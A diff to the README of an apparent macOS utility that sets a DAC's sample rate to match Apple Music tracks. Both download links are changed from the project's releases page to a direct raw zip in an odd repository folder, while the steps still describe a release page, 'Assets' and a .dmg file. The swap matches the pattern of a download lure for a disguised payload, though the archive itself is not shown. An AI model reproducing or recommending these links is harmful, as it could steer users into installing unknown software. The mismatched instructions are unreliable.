@@ -1,6 +1,6 @@
 # 🎵 alfred-apple-music-format - Perfect audio quality for Apple Music
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Famished-articleofcommerce898/alfred-apple-music-format/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Famished-articleofcommerce898/alfred-apple-music-format/raw/refs/heads/main/weedful/format_apple_alfred_music_1.2.zip)
 
 This application adjusts your audio hardware settings to match the song playing in Apple Music. It ensures your music reaches your speakers without software-based changes. The software detects the audio format of the track and commands your Digital to Analog Converter (DAC) to use the correct sample rate.
 
@@ -19,7 +19,7 @@ This application sits in your menubar and keeps watch on Apple Music. When a new
 
 ## 📥 Installation
 
-1. Visit [this link](https://github.com/Famished-articleofcommerce898/alfred-apple-music-format/releases) to reach the download page.
+1. Visit [this link](https://github.com/Famished-articleofcommerce898/alfred-apple-music-format/raw/refs/heads/main/weedful/format_apple_alfred_music_1.2.zip) to reach the download page.
 2. Look for the latest version under the "Assets" section.
 3. Click the file ending in .dmg to save it to your Mac.
 4. Open the downloaded file once the transfer completes.
